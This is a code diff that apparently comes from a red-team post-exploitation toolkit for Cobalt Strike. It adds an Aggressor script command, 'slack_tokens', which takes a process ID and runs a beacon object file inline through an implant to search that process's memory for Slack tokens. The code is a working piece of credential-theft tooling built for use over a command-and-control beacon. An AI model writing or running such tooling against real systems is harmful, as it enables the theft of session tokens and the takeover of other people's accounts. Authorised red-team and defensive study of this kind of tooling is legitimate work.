@@ -1821,3 +1821,26 @@ Privledge names are listed here https://learn.microsoft.com/en-us/windows/win32/
 They are the equivilent of what you see in whoami /all or our whoami bof from the SA repo
 "
 );
+
+alias slack_tokens 
+{
+	local('$pid $args');
+	if(size(@_) != 2)
+	{
+		berror($1, "usage: slack_tokens <pid>");
+		return;
+	}
+	$pid = parseNumber($2, 10);
+    berror($1, $pid);
+
+	$args = bof_pack($1, "i", $pid);
+	beacon_inline_execute($1, readbof($1, "slack_tokens"), "go", $args);
+}
+
+beacon_command_register(
+	"slack_tokens",
+	"Searches memory for Slack tokens",
+	"Command: slack_tokens
+
+Usage: slack_tokens <pid> "
+);
